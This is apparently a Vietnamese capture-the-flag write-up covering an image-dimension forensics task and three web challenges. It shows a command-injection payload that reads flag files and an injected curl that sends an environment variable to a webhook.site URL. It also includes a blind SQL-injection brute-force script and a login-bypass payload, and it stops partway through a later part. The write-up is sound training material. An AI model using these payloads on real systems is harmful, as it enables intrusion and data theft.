### minictf-w1
## Forensics
# Dimension
- Đầu Tiên ta nhận được một fize ảnh có kích thước là 0x0.
- Và tên bài là Dimension nên mình đã nãy ra ý tưởng dùng tool Dimension-brutefocer.
- Tuy nhiên mình cần phải chỉnh lại code của tool một tí.

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/84c2f782-9cdb-496b-a2b0-813f812581f0)

- Điều chỉnh lại phạm vị bf và chạy code ta được kết quả sau.

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/65e97af0-e736-424f-b4c1-5c35ddd0c4d4)

- Mở file ảnh mới được fix lên thì ta được flag.

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/22c7c965-7ed4-4b2a-886e-84731fe40f3e)

## Web Application
# Head1
- Src:
```php
<?php

if (strpos($_SERVER['REQUEST_URI'], '_')) {
    die("no no no");
}

if (isset($_GET['input_data'])) {
    $output = shell_exec("curl --head " . $_POST['input_data']);
    echo $output;
}

show_source(__FILE__);
```
- Nói nôm na là chúng ta sẽ phải gửi một get parameter lên server với tên là ```input_data``` và POST giá trị đó để thực hiện câu lệnh ```curl  --head``` .
- Tuy nhiên, ở dùng if thứ nhất đã chặn mọi url có kí tự ```_``` .
- Vì vậy mình đã quyết định dùng Curl để POST thẳng lên url yêu cầu.
- Về phần fillter thì mình đã thay thế ```_``` bằng kí tự ```%5F``` nó tương đương với dấu nhưng không bị chặn bởi fillter.
- Tiếp theo là câu lệnh shell mà mình sẽ gửi lên để nhận dc flag là ```; cat /flag*```.
- Payload: ```curl -X POST -d 'input_data=; cat /flag*' http://45.122.249.68:20018/\?input%5Fdata\=```.

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/fc836655-2539-4aa7-8995-b6bbfd840cb1)

- Flag: ```W1{ez_head1_huh}```

# Head2
- Src:
```php
<?php

if (isset($_GET['input_data'])) {
    $output = shell_exec("curl --head " . $_GET['input_data']);
    // echo $output;
}

show_source(__FILE__);
```
- Phần src của bài này tương tự bài trước thậm chí còn ngắn hơn là không có fillter, và phần dữ liệu được gửi đi sẽ được GET thay vì POST.
- Tới đây ta sẽ dùng webhook để bắt dữ liệu.

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/cb52aa03-234d-4340-9065-8ed8f3ba8193)

- Payload: ```curl --request POST \
  --url 'http://45.122.249.68:20019/?input_data=%3B%20echo%20%24FLAG%20%7C%20curl%20-H%20%22Content-Type%3A%20text%2Fplain%22%20-X%20POST%20-d%20%40-%20https%3A%2F%2Fwebhook.site%2Fcd4e9f72-a6bf-4076-ad32-31f29bf180bc'```

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/00f3d243-3964-41a8-b755-fd34ca7315dd)

- Flag: ```W1{webhook_not_so_bad_huh?}```

# Dejavu 

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/b0613390-77e6-44b9-8c12-fd2e845eb5bc)

- Chall này khá giống với chall được dạy ở training nhưng có lẻ đã khác vài chỗ.
- Flag vẫn nằm trong db và có 3 phần.
- Mình sẽ chia bài này ra làm 4 phần để nói, cụ thể là loign, part1, part2, và part3.
- Login:
    + Nếu đọc kĩ src thì bạn sẽ thấy flag nằm ở pass của admin.
    + Và để vào được News.php thì bạn phải là admin.
    + Từ đây chúng ta có 2 hướng giải quyết, một là bf pass của admin để login cũng như là tìm flag, hai là sqli để bypass phần login.
    + Lúc đầu mình đã thử bf cái pass nhưng có vẻ không khả quan ( chắc là có kí tự lạ ).
    + code bf của mình :
  ```py
  import requests
  import string

  alphabet = string.ascii_lowercase + string.ascii_uppercase + \
      string.digits + '{' + '}' + '_' + '.'

  url = "http://45.122.249.68:20017/login.php"
  flag = ""
  pos = 1

  while True:
      for char in range(65, 100000):
          char = chr(char)
          data = {
              "username": f"admin' AND SUBSTRING((SELECT password FROM users WHERE username = 'admin'), {pos}, 1) = '{char}'-- -",
              "password": "abcd"
          }
          r = requests.post(url, data=data)
          if r.url == "http://45.122.249.68:20017/news.php":
              pos += 1
              flag += char
              print("Flag:", flag)
              break
      else:
          continue
  ```
    + Sau khi bf không hiệu quả, mình đã chuyển qua sqli với payload
      
  ```sql
  user: admin
  pass: ' OR Password in (Select Password From users WHERE username='admin') AND ''='
  ```
    + Login xong ta sẽ vào được news.php và tới bước tiếp theo.

     ![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/2cf03007-7a41-4669-ad4e-36fe9e1bea87)

- Part1 :
    + Ở news.php, server sẽ nhận một get param tên là name rồi từ đó thực hiện truy vấn.
    + Ta có thể sqli từ đây.

    
